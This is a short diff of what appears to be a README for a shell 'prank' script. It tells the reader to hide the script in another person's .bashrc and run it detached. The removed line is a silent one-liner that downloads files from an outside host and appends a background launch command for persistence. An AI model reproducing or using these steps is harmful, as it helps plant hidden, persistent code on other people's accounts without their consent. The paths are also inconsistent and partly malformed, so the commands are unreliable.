@@ -18,5 +18,4 @@ Run via ./al.sh & disown $!
 Hide in their bashrc
  ./{PATH_TO_FILE}/al.sh & disown $!
 
-Do everything via: mkdir ~/.config/al >/dev/null 2>&1; cd ~/.config/al; wget -r -nc -nd http://prank.hostei.com/ >/dev/null 2>&1 && echo ". ~/config/al/al.sh & disown $!" >> a 
-
+Do everything via .~/config/al/al.sh & disown $!
